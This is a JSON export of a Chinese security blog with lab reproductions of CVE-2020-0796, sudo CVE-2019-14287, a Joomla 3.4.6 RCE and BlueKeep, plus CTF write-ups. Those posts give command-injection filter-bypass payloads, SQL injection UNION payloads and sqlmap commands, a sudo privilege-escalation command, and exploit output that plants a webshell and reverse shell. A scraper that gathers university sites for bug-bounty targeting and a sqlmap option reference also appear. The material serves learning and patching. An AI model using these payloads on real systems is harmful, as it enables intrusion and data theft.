{"meta":{"title":"shym's blog","subtitle":"shym's blog","description":null,"author":"shym","url":"https:///login546.github.io","root":"/"},"pages":[{"title":"About Shym","date":"2021-01-22T08:48:08.994Z","updated":"2021-01-22T08:48:08.994Z","comments":false,"path":"about/index.html","permalink":"https:///login546.github.io/about/index.html","excerpt":"","text":"1234&#123;Print(\"hello world\")Print(\"~.~\")&#125;"},{"title":"分类","date":"2021-01-22T08:48:08.994Z","updated":"2021-01-22T08:48:08.994Z","comments":false,"path":"categories/index.html","permalink":"https:///login546.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-01-22T08:48:08.994Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"links/index.html","permalink":"https:///login546.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-01-22T08:48:08.994Z","updated":"2021-01-22T08:48:08.994Z","comments":false,"path":"repository/index.html","permalink":"https:///login546.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-01-22T08:48:08.994Z","updated":"2021-01-22T08:48:08.994Z","comments":false,"path":"tags/index.html","permalink":"https:///login546.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"CVE-2020-0796复现","slug":"CVE-2020-0796复现","date":"2020-04-01T15:25:05.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2020/04/01/CVE-2020-0796复现/","link":"","permalink":"https:///login546.github.io/2020/04/01/CVE-2020-0796复现/","excerpt":"","text":"CVE-2020-0796漏洞复现漏洞简介​ Microsoft Windows和Microsoft Windows Server都是美国微软（Microsoft）公司的产品，Microsoft Windows是一套个人设备使用的操作系统，Microsoft Windows Server是一套服务器操作系统，Server Message Block是其中的一个服务器信息传输协议。微软公布了在Server Message Block 3.0（SMBv3）中发现的“蠕虫型”预授权远程代码执行漏洞。 影响版本​ 适用于32位系统的Windows 10版本1903 Windows 10 1903版（用于基于x64的系统） Windows 10 1903版（用于基于ARM64的系统） Windows Server 1903版（服务器核心安装） 适用于32位系统的Windows 10版本1909 Windows 10版本1909（用于基于x64的系统） Windows 10 1909版（用于基于ARM64的系统） Windows Server版本1909（服务器核心安装） 环境准备 win10-1903版本下载 exploit地址 exp需要自己编译，这里放个编译好的 已编译文件下载 漏洞复现 复现注意需系统未安装更新补丁KB4551762 漏洞修复修复补丁","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https:///login546.github.io/categories/漏洞复现/"}],"tags":[{"name":"CVE-2020-0796","slug":"CVE-2020-0796","permalink":"https:///login546.github.io/tags/CVE-2020-0796/"}]},{"title":"RCE远程命令执行绕过","slug":"RCE远程命令执行绕过","date":"2020-03-17T17:01:45.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2020/03/17/RCE远程命令执行绕过/","link":"","permalink":"https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/","excerpt":"","text":"做ctfhub后小总结，以及参考 空格过滤空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过 1234567cat&lt;flag //重定向符cat&lt;&gt;flag //重定向符cat$&#123;IFS&#125;flag //IFS可能也过滤了&#123;&#125;，用$IFS$1代替：?ip=127.0.0.1;cat$IFS$1index.phpcat%09flag //其他字符代替&#123;cat,flag&#125; //&#123;,&#125; 命令分隔符12345678910111213linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（.bat文件中的命令分隔符）;： 在 shell 中，担任”连续指令”功能的符号就是”分号”。命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。&amp;：简单拼接 无制约&amp;&amp;：前面执行成功后面才会执行|：符号 左边输出 作为右边输入，所以左边的输出并不显示。当第一条命令失败时，它仍然会执行第二条命令||：前面执行失败才会执行后面 敏感字符过滤绕过过滤ls、cat、flag等 编码绕过base1234567[shymdembp:~][shym]% echo 'cat' | base64Y2F0Cg==[shymdembp:~][shym]% `echo 'Y2F0Cg==' | base64 -d` flag.txtflag&#123;sadas_sadsad_sadasdad-sdsad&#125;[shymdembp:~] hex12345[shymdembp:~][shym]% echo \"63617420666C61672E747874\" | xxd -r -p|bashflag&#123;sadas_sadsad_sadasdad-sdsad&#125;[shymdembp:~][shym]% oct(八进制)12345[shymdembp:~][shym]% printf \"\\154\\163\"ls% [shymdembp:~][shym]% printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"cat /flag% 连字符绕过123456789[shymdembp:test][shym]% ca''t flagflag&#123;123-4123--213-213-123&#125;[shymdembp:test][shym]% ca''t fl''agflag&#123;123-4123--213-213-123&#125;[shymdembp:test][shym]% c''at fla''gflag&#123;123-4123--213-213-123&#125; 变量绕过1a=l;b=s;$a$b 反斜杠绕过12345[shym]% ca\\t fl\\agflag&#123;123-4123--213-213-123&#125;[shymdembp:test][shym]% c\\at f\\lagflag&#123;123-4123--213-213-123&#125; ip进制转换绕过12345//ip地址过滤可将ip地址转化为数字ip地址IP地址用“点分十进制”表示，用“.”分成4部分；数字地址是一串用“十进制”表示的数字。 比如：百度的IP地址“39.156.69.79”转换成数字地址就是“664552783”。在浏览器中输入664552783就可以访问百度网站转化网址：http://www.msxindl.com/tools/ip/ip_num.asp 无回显创建文件绕过123linux下用 1&gt;1 可创建文件名为1的空文件。 a&gt;1 虽报错，但可以创建空文件。 ls&gt;1 把ls的内容导入1中 在做这类题目时，一部分会给出源代码，我们可以直接参考源代码进行选择绕过让法。 如果没有，我们需要去猜测后台语句如何构造的，过滤了哪些，还有哪些可以用，然后结合各种绕过方式构造payload。","categories":[{"name":"Bypass","slug":"Bypass","permalink":"https:///login546.github.io/categories/Bypass/"}],"tags":[{"name":"CTFhub-RCE","slug":"CTFhub-RCE","permalink":"https:///login546.github.io/tags/CTFhub-RCE/"}]},{"title":"CTFhub注入题目","slug":"CTFhub注入题目","date":"2020-03-04T16:46:33.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2020/03/04/CTFhub注入题目/","link":"","permalink":"https:///login546.github.io/2020/03/04/CTFhub注入题目/","excerpt":"","text":"SQL注入整数型注入CTFHub SQL 整数型注入 sqlmap一把梭1sqlmap -u &quot;http://challenge-4ac9e4a80dea47f1.sandbox.ctfhub.com:10080/?id=12345&quot; -D sqli -T flag -C flag --dump 手注当我们输入提示的数字1时，前端仅显示了一条数据 构造payload 12341 or 1=1 limit 1 offset 0 回显---&gt;ID=1 Data:ctfhub1 or 1=1 limit 1 offset 2 回显---&gt;ID=114514 Data:sqli12345 union select database(),2 回显---&gt;ID: sqli Data:2 然后information_schema一把梭 先查表名 112345 union select group_concat(table_name),2 from information_schema.tables where table_schema=&apos;sqli&apos; 再查字段名 112345 union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;flag&apos; 注入得到flag 112345 union select flag,2 from sqli.flag 字符型注入CTFHub SQL字符型注入 sqlmap一把梭1sqlmap -u &quot;http://challenge-940a484565709b61.sandbox.ctfhub.com:10080/?id=11111&quot; -D sqli -T flag -C flag --dump 手注我们输入1看到和整数型注入是一样的，只有两处回显。 然后我们注意引号和注释直接联合查询 112345&apos; union select database(),2 &apos; 查表 112345&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=&apos;sqli&apos; &apos; 查字段 112345&apos; union select group_concat(column_name) ,2 from information_schema.columns where table_name=&apos;flag&apos; # 注入得到flag 112345&apos; union select flag,2 from sqli.flag # 将持续更新。。。","categories":[{"name":"writeup","slug":"writeup","permalink":"https:///login546.github.io/categories/writeup/"}],"tags":[{"name":"CTFhub","slug":"CTFhub","permalink":"https:///login546.github.io/tags/CTFhub/"}]},{"title":"爬区国内所有高校名单","slug":"爬区国内所有高校官网地址","date":"2019-12-30T11:26:50.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/12/30/爬区国内所有高校官网地址/","link":"","permalink":"https:///login546.github.io/2019/12/30/爬区国内所有高校官网地址/","excerpt":"","text":"在挖教育src时，发现手动找高校链接太慢，于是网上搜了下在http://www.hao123.com/edu 发现了收录了国内高校的链接即名称，嘿嘿～ 爬取各地大学链接123456789from urllib.request import urlopen#用于获取网页from bs4 import BeautifulSoup#用于解析网页html = urlopen('http://www.hao123.com/edu')#爬取带大学url的页面bsObj = BeautifulSoup(html, 'html.parser')t1 = bsObj.find_all('a')for t2 in t1: t3 = t2.get('href') print(t3) 筛选得到的url 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121http://www.hao123.com/eduhtm/edubj.htmhttp://www.hao123.com/eduhtm/edubj02.htmhttp://www.hao123.com/eduhtm/edubj03.htmhttp://www.hao123.com/eduhtm/edubj04.htmhttp://www.hao123.com/eduhtm/edutj.htmhttp://www.hao123.com/eduhtm/edutj02.htmhttp://www.hao123.com/eduhtm/tj03.htmhttp://www.hao123.com/eduhtm/tj04.htmhttp://www.hao123.com/eduhtm/hb.htmhttp://www.hao123.com/eduhtm/hb02.htmhttp://www.hao123.com/eduhtm/hb03.htmhttp://www.hao123.com/eduhtm/hb04.htmhttp://www.hao123.com/eduhtm/jilin.htmhttp://www.hao123.com/eduhtm/jilin02.htmhttp://www.hao123.com/eduhtm/jilin03.htmhttp://www.hao123.com/eduhtm/jilin04.htmhttp://www.hao123.com/eduhtm/numeg.htmhttp://www.hao123.com/eduhtm/nmg02.htmhttp://www.hao123.com/eduhtm/nmg03.htmhttp://www.hao123.com/eduhtm/nmg04.htmhttp://www.hao123.com/eduhtm/shnagxi.htmhttp://www.hao123.com/eduhtm/sx02.htmhttp://www.hao123.com/eduhtm/sx03.htmhttp://www.hao123.com/eduhtm/sx04.htmhttp://www.hao123.com/eduhtm/edusy.htmhttp://www.hao123.com/eduhtm/ln02.htmhttp://www.hao123.com/eduhtm/ln03.htmhttp://www.hao123.com/eduhtm/ln04.htmhttp://www.hao123.com/eduhtm/guansu.htmhttp://www.hao123.com/eduhtm/gs02.htmhttp://www.hao123.com/eduhtm/gs03.htmhttp://www.hao123.com/eduhtm/gs04.htmhttp://www.hao123.com/eduhtm/edush.htmhttp://www.hao123.com/eduhtm/sh02.htmhttp://www.hao123.com/eduhtm/sh03.htmhttp://www.hao123.com/eduhtm/sh04.htmhttp://www.hao123.com/eduhtm/guangxi.htmhttp://www.hao123.com/eduhtm/gx02.htmhttp://www.hao123.com/eduhtm/gx03.htmhttp://www.hao123.com/eduhtm/gx04.htmhttp://www.hao123.com/eduhtm/eduhz.htmhttp://www.hao123.com/eduhtm/zj02.htmhttp://www.hao123.com/eduhtm/zj03.htmhttp://www.hao123.com/eduhtm/zj04.htmhttp://www.hao123.com/eduhtm/anfei.htmhttp://www.hao123.com/eduhtm/ah02.htmhttp://www.hao123.com/eduhtm/ah03.htmhttp://www.hao123.com/eduhtm/ah04.htmhttp://www.hao123.com/eduhtm/fujian.htmhttp://www.hao123.com/eduhtm/fj02.htmhttp://www.hao123.com/eduhtm/fj03.htmhttp://www.hao123.com/eduhtm/fj04.htmhttp://www.hao123.com/eduhtm/jianxi.htmhttp://www.hao123.com/eduhtm/jx02.htmhttp://www.hao123.com/eduhtm/jx03.htmhttp://www.hao123.com/eduhtm/jx04.htmhttp://www.hao123.com/eduhtm/xizang.htmhttp://www.hao123.com/eduhtm/xz02.htmhttp://www.hao123.com/eduhtm/henan.htmhttp://www.hao123.com/eduhtm/hn02.htmhttp://www.hao123.com/eduhtm/hn03.htmhttp://www.hao123.com/eduhtm/hn04.htmhttp://www.hao123.com/eduhtm/eduwh.htmhttp://www.hao123.com/eduhtm/hubei02.htmhttp://www.hao123.com/eduhtm/hubei03.htmhttp://www.hao123.com/eduhtm/hubei04.htmhttp://www.hao123.com/eduhtm/hunan.htmhttp://www.hao123.com/eduhtm/hunan02.htmhttp://www.hao123.com/eduhtm/hunan03.htmhttp://www.hao123.com/eduhtm/hunan04.htmhttp://www.hao123.com/eduhtm/edugz.htmhttp://www.hao123.com/eduhtm/guangdong02.htmhttp://www.hao123.com/eduhtm/guangdong03.htmhttp://www.hao123.com/eduhtm/guangdong04.htmhttp://www.hao123.com/eduhtm/xinjang.htmhttp://www.hao123.com/eduhtm/xinjiang02.htmhttp://www.hao123.com/eduhtm/xinjiang03.htmhttp://www.hao123.com/eduhtm/xinjiang04.htmhttp://www.hao123.com/eduhtm/educq.htmhttp://www.hao123.com/eduhtm/chongqing02.htmhttp://www.hao123.com/eduhtm/chongqing03.htmhttp://www.hao123.com/eduhtm/chongqing04.htmhttp://www.hao123.com/eduhtm/educd.htmhttp://www.hao123.com/eduhtm/sichuan02.htmhttp://www.hao123.com/eduhtm/sichuan03.htmhttp://www.hao123.com/eduhtm/sichuan04.htmhttp://www.hao123.com/eduhtm/shangdong.htmhttp://www.hao123.com/eduhtm/shandong02.htmhttp://www.hao123.com/eduhtm/shandong03.htmhttp://www.hao123.com/eduhtm/shandong04.htmhttp://www.hao123.com/eduhtm/yunnan.htmhttp://www.hao123.com/eduhtm/yunnan02.htmhttp://www.hao123.com/eduhtm/yunnan03.htmhttp://www.hao123.com/eduhtm/yunnan04.htmhttp://www.hao123.com/eduhtm/eduhab.htmhttp://www.hao123.com/eduhtm/heilongjiang02.htmhttp://www.hao123.com/eduhtm/heilongjiang03.htmhttp://www.hao123.com/eduhtm/heilongjiang04.htmhttp://www.hao123.com/eduhtm/edunanjin.htmhttp://www.hao123.com/eduhtm/jiangsu02.htmhttp://www.hao123.com/eduhtm/jiangsu03.htmhttp://www.hao123.com/eduhtm/jiangsu04.htmhttp://www.hao123.com/eduhtm/eduxia.htmhttp://www.hao123.com/eduhtm/shanxi02.htmhttp://www.hao123.com/eduhtm/shanxi03.htmhttp://www.hao123.com/eduhtm/shanxi04.htmhttp://www.hao123.com/eduhtm/gz.htmhttp://www.hao123.com/eduhtm/guizhou02.htmhttp://www.hao123.com/eduhtm/guizhou03.htmhttp://www.hao123.com/eduhtm/guizhou04.htmhttp://www.hao123.com/eduhtm/qingdao.htmhttp://www.hao123.com/eduhtm/qinghai02.htmhttp://www.hao123.com/eduhtm/qinghai03.htmhttp://www.hao123.com/eduhtm/qinghai04.htmhttp://www.hao123.com/eduhtm/nixai.htmhttp://www.hao123.com/eduhtm/ningxia02.htmhttp://www.hao123.com/eduhtm/ningxia03.htmhttp://www.hao123.com/eduhtm/ningxia04.htmhttp://www.hao123.com/eduhtm/hainan.htmhttp://www.hao123.com/eduhtm/hainan02.htmhttp://www.hao123.com/eduhtm/hainan04.htm 爬取以上中的具体院校信息123456789101112import reimport urllib.requestfor line in open(\"1.txt\",'rt'): res = urllib.request.urlopen(line) html = res.read().decode('gb2312') rule = re.findall(r\"&lt;p&gt; &lt;a.*?href=.*?&lt;\\/a&gt;&lt;/p&gt;&lt;/td&gt;\", html, re.I|re.S|re.M) for value in rule: with open('edu-urls.txt', 'a') as f: print(value.strip('&lt;p&gt; '),file=f)print(\"it's ok\")~ 得到最后的院校信息edu-urls.txt，一共2865条信息。 整理结果Download 以上结果中存在百度百科的链接，没有去过滤，如需要请自行过滤。","categories":[{"name":"python","slug":"python","permalink":"https:///login546.github.io/categories/python/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https:///login546.github.io/tags/爬虫/"}]},{"title":"CVE-2019-14287之sudo提权复现","slug":"CVE-2019-14287之sudo提权复现","date":"2019-10-16T22:05:39.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/10/16/CVE-2019-14287之sudo提权复现/","link":"","permalink":"https:///login546.github.io/2019/10/16/CVE-2019-14287之sudo提权复现/","excerpt":"","text":"CVE-2019-14287漏洞复现前言漏洞前两天就爆出了，迫于手头有渗透测试任务没来的及复现，今天晚上跑步回来一试。。。 复现动画 复现环境 macOS Catalina 10.15 复现过程 切换至root用户，为/etc/sudoers添加 test ALL = (ALL,!root) ALL 切换至test用户，执行sudo -u#-1 whoami 终端输出 root 或 4294967295（root的id） 漏洞影响sudo版本&lt;1.8.28 此漏洞的利用需要使用户具有sudo的权限 漏洞修复 升级至最新版本sudo 修改配置","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https:///login546.github.io/categories/漏洞复现/"}],"tags":[{"name":"CVE-2019-14287","slug":"CVE-2019-14287","permalink":"https:///login546.github.io/tags/CVE-2019-14287/"}]},{"title":"Joomla3.4.6-RCE漏洞复现分析","slug":"Joomla3-4-6-RCE漏洞复现分析","date":"2019-10-10T09:59:37.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/10/10/Joomla3-4-6-RCE漏洞复现分析/","link":"","permalink":"https:///login546.github.io/2019/10/10/Joomla3-4-6-RCE漏洞复现分析/","excerpt":"","text":"Joomla 3.0.0-3.4.6 RCE 漏洞复现分析前言昨天就看到了许多安全媒体发布了Joomla RCE 漏洞的预警，一直到今天早上才有时间进行简单的复现和分析。 漏洞分析主要是由于Joomla对于Session处理不当，可伪造Session，进行反序列化攻击。 环境搭建Joomla 3.4.6 下载地址 Joomla-3.4.6-RCE.py 下载地址 漏洞验证 12345678910111213141516171819202122##验证漏洞是否存在，如果存在则输出Vulnerable[shym]% python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Vulnerable[*] Use --exploit to exploit it[ShymdeMBP:joomla3.0.0-3.4.6]##利用exp进行攻击：--explpit 监听主机地址：--lhost 监听主机端口：--lport [shym]% python3 joomla-3.4.6-RCE.py -t http://192.168.2.164/ --exploit --lhost 192.168.2.173 --lport 9001[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Vulnerable[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Backdoor implanted, eval your code at http://192.168.2.164//configuration.php ##成功挂马的地址in a POST with jnyitzoezgaovqplmmjhjmjrvydzmiocrpxzpumwsihhhvozha ##随机生成的密码[*] Now it's time to reverse, trying with a system + perl 成功利用后，会在/configuration.php插入一句话木马，如下图 蚁剑成功连接 简单分析Session处理问题Joomla改变了原本php对session的处理规则，导致在登录过程中，先执行write函数，再执行read函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344# libraries/joomla/session/storage/database.php /** * Write session data to the SessionHandler backend. * * @param string $id The session identifier. * @param string $data The session data. * * @return boolean True on success, false otherwise. * * @since 11.1 */ public function write($id, $data) &#123; // Get the database connection object and verify its connected. $db = JFactory::getDbo(); $data = str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data); try &#123; $query = $db-&gt;getQuery(true) -&gt;update($db-&gt;quoteName('#__session')) -&gt;set($db-&gt;quoteName('data') . ' = ' . $db-&gt;quote($data)) -&gt;set($db-&gt;quoteName('time') . ' = ' . $db-&gt;quote((int) time())) -&gt;where($db-&gt;quoteName('session_id') . ' = ' . $db-&gt;quote($id)); // Try to update the session data in the database table. $db-&gt;setQuery($query); if (!$db-&gt;execute()) &#123; return false; &#125; /* Since $db-&gt;execute did not throw an exception, so the query was successful. Either the data changed, or the data was identical. In either case we are done. */ return true; &#125; catch (Exception $e) &#123; return false; &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435/** * Read the data for a particular session identifier from the SessionHandler backend. * * @param string $id The session identifier. * * @return string The session data. * * @since 11.1 */public function read($id)&#123; // Get the database connection object and verify its connected. $db = JFactory::getDbo(); try &#123; // Get the session data from the database table. $query = $db-&gt;getQuery(true) -&gt;select($db-&gt;quoteName('data')) -&gt;from($db-&gt;quoteName('#__session')) -&gt;where($db-&gt;quoteName('session_id') . ' = ' . $db-&gt;quote($id)); $db-&gt;setQuery($query); $result = (string) $db-&gt;loadResult(); $result = str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $result); return $result; &#125; catch (Exception $e) &#123; return false; &#125;&#125; 在上面write17行中，由于mysql无法处理null字节，所以在写入时将 chr(0) . &#39;*&#39; . chr(0)替换为\\0\\0\\0，然而protected修饰的字段在序列化后含有\\x00\\x2a\\x00，读取时，将字符替换还原，防止无法正常反序列化。如果写入数据库的时候，是\\0\\0\\0， 取出来的时候将会变成chr(0) . &#39;*&#39; . chr(0)，入库时候生成的序列化数据长度为6\\0\\0\\0，造成溢出，那么取出来的时候将会成为3N*N，反序列化时，如按照原先的长度读取，后续的字符将被吃掉。所以可以利用\\0\\0\\0溢出，来逃逸密码。然后构造有效对象，发送exp，触发exp既可。…… 漏洞修复1、更新至最新版本","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https:///login546.github.io/categories/漏洞复现/"}],"tags":[{"name":"Joomla3.0.0-3.4.5 RCE","slug":"Joomla3-0-0-3-4-5-RCE","permalink":"https:///login546.github.io/tags/Joomla3-0-0-3-4-5-RCE/"}]},{"title":"CVE-2019-0708漏洞复现","slug":"CVE-2019-0708漏洞复现","date":"2019-09-07T10:30:29.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/09/07/CVE-2019-0708漏洞复现/","link":"","permalink":"https:///login546.github.io/2019/09/07/CVE-2019-0708漏洞复现/","excerpt":"","text":"CVE-2019-0708漏洞复现 环境准备 Windows7 sp1 下载链接 exploit地址 配置exp攻击套件放到msf对应位置，如存在，请覆盖。如下对应地址 1234567rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 运行1234进入程序：msfconsole重载：reload_all启用0708攻击模块：use exploit/windows/rdp/cve_2019_0708_bluekeep_rce查看配置：info 12345678910设置RHOSTS、RPOTRT、targettarget有0-4，设置成自己对应的msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RHOSTS 10.211.55.3RHOSTS =&gt; 10.211.55.3msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RPORT 3389RPORT =&gt; 3389msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 1target =&gt; 1msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run 漏洞修复补丁Download","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https:///login546.github.io/categories/漏洞复现/"}],"tags":[{"name":"CVE-2019-0708","slug":"CVE-2019-0708","permalink":"https:///login546.github.io/tags/CVE-2019-0708/"}]},{"title":"sqlmap参数详解","slug":"sqlmap参数详解","date":"2019-08-07T09:50:41.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/08/07/sqlmap参数详解/","link":"","permalink":"https:///login546.github.io/2019/08/07/sqlmap参数详解/","excerpt":"","text":"sqlmap参数经常忘，所以就收集了大佬整理的一份参数详解。方便使用和查询。 Options（选项）1234567891011121314151617181920Usage: python sqlmap.py [options]Options（选项）:-h, --help Show basic help message and exit## 展示帮助文档 参数-hh Show advanced help message and exit## 展示详细帮助文档参数--version Show program's version number and exit## 显示程序的版本号-v VERBOSE Verbosity level: 0-6 (default 1)## 详细级别：0-6（默认为1） Target（目标）123456789101112131415161718192021222324252627282930313233343536Target（目标）:At least one of these options has to be provided to define the target(s)-d DIRECT Connection string for direct database connection## 指定具体数据库-u URL, --url=URL Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")## 目标URL-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file## 解析目标(s)从Burp或WebScarab代理日志文件-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file## 解析目标(s)从远程站点地图文件(.xml)-m BULKFILE Scan multiple targets given in a textual file## 扫描文本文件中给出的多个目标-r REQUESTFILE Load HTTP request from a file## 从本地文件加载HTTP请求 ，多用于post注入。-g GOOGLEDORK Process Google dork results as target URLs## 处理Google的结果作为目标URL。-c CONFIGFILE Load options from a configuration INI file## 从INI配置文件中加载选项。 Request（请求）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160Request（请求）:These options can be used to specify how to connect to the target URL## 这些选项可以用来指定如何连接到目标URL。--method=METHOD Force usage of given HTTP method (e.g. PUT)## 强制使用给定的HTTP方法（e.g. PUT）--data=DATA Data string to be sent through POST## 通过POST发送的数据字符串--param-del=PARA.. Character used for splitting parameter values## 用于拆分参数值的字符--cookie=COOKIE HTTP Cookie header value HTTP## Cookie头的值--cookie-del=COO.. Character used for splitting cookie values## 用于分割Cookie值的字符--load-cookies=L.. File containing cookies in Netscape/wget format## 包含Netscape / wget格式的cookie的文件--drop-set-cookie Ignore Set-Cookie header from response## 从响应中忽略Set-Cookie头--user-agent=AGENT HTTP User-Agent header value## 指定 HTTP User - Agent头--random-agent Use randomly selected HTTP User-Agent header value## 使用随机选定的HTTP User - Agent头--host=HOST HTTP Host header value## HTTP主机头值--referer=REFERER HTTP Referer header value## 指定 HTTP Referer头-H HEADER, --hea.. Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")## 额外header--headers=HEADERS Extra headers (e.g. \"Accept-Language: fr\\\\nETag: 123\")## 额外header--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP## 认证类型(Basic, Digest, NTLM or PKI)--auth-cred=AUTH.. HTTP authentication credentials (name:password)## HTTP认证凭证(name:password)--auth-file=AUTH.. HTTP authentication PEM cert/private key file## HTTP认证 PEM认证/私钥文件--ignore-401 Ignore HTTP Error 401 (Unauthorized)## 忽略HTTP错误401--proxy=PROXY Use a proxy to connect to the target URL## 使用代理连接到目标网址--proxy-cred=PRO.. Proxy authentication credentials (name:password)## 代理认证证书(name:password)--proxy-file=PRO.. Load proxy list from a file## 从文件中加载代理列表--ignore-proxy Ignore system default proxy settings## 忽略系统默认代理设置--tor Use Tor anonymity network## 使用Tor匿名网络--tor-port=TORPORT Set Tor proxy port other than default## 设置Tor代理端口而不是默认值--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)## 设置Tor代理类型--check-tor Check to see if Tor is used properly## 检查Tor是否正确使用--delay=DELAY Delay in seconds between each HTTP request## 每个HTTP请求之间的延迟（秒）--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)## 秒超时连接前等待（默认30）--retries=RETRIES Retries when the connection timeouts (default 3)## 连接超时时重试（默认值3）--randomize=RPARAM Randomly change value for given parameter(s)## 随机更改给定参数的值(s)--safe-url=SAFEURL URL address to visit frequently during testing## 在测试期间频繁访问的URL地址--safe-post=SAFE.. POST data to send to a safe URL## POST数据发送到安全URL--safe-req=SAFER.. Load safe HTTP request from a file## 从文件加载安全HTTP请求--safe-freq=SAFE.. Test requests between two visits to a given safe URL## 在两次访问给定安全网址之间测试请求--skip-urlencode Skip URL encoding of payload data## 跳过有效载荷数据的URL编码--csrf-token=CSR.. Parameter used to hold anti-CSRF token## 参数用于保存anti-CSRF令牌--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token## 提取anti-CSRF URL地址访问令牌--force-ssl Force usage of SSL/HTTPS## 强制使用SSL /HTTPS--hpp Use HTTP parameter pollution method## 使用HTTP参数pollution的方法--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码\"import hashlib;id2=hashlib.md5(id).hexdigest()\") Optimization（优化）12345678910111213141516171819202122232425Optimization（优化）:These options can be used to optimize the performance of sqlmap## 这些选项可用于优化sqlmap的性能-o Turn on all optimization switches## 开启所有优化开关--predict-output Predict common queries output## 预测常见的查询输出--keep-alive Use persistent HTTP(s) connections## 使用持久的HTTP（S）连接--null-connection Retrieve page length without actual HTTP response body## 从没有实际的HTTP响应体中检索页面长度--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)## 最大的HTTP（S）请求并发量（默认为1） Injection（注入）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465Injection（注入）:These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts## 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。-p TESTPARAMETER Testable parameter(s)## 可测试的参数（S）--skip=SKIP Skip testing for given parameter(s)## 跳过对给定参数的测试--skip-static Skip testing parameters that not appear to be dynamic## 跳过测试不显示为动态的参数--param-exclude=.. Regexp to exclude parameters from testing (e.g. \"ses\")## 使用正则表达式排除参数进行测试（e.g. \"ses\"）--dbms=DBMS Force back-end DBMS to this value## 强制后端的DBMS为此值--dbms-cred=DBMS.. DBMS authentication credentials (user:password)## DBMS认证凭证(user:password)--os=OS Force back-end DBMS operating system to this value## 强制后端的DBMS操作系统为这个值--invalid-bignum Use big numbers for invalidating values## 使用大数字使值无效--invalid-logical Use logical operations for invalidating values## 使用逻辑操作使值无效--invalid-string Use random strings for invalidating values## 使用随机字符串使值无效--no-cast Turn off payload casting mechanism## 关闭有效载荷铸造机制--no-escape Turn off string escaping mechanism## 关闭字符串转义机制--prefix=PREFIX Injection payload prefix string## 注入payload字符串前缀--suffix=SUFFIX Injection payload suffix string## 注入payload字符串后缀--tamper=TAMPER Use given script(s) for tampering injection data## 使用给定的脚本（S）篡改注入数据 Detection（检测）1234567891011121314151617181920212223242526272829303132333435Detection（检测）:These options can be used to customize the detection phase## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。--level=LEVEL Level of tests to perform (1-5, default 1)## 执行测试的等级（1-5，默认为1）--risk=RISK Risk of tests to perform (1-3, default 1)## 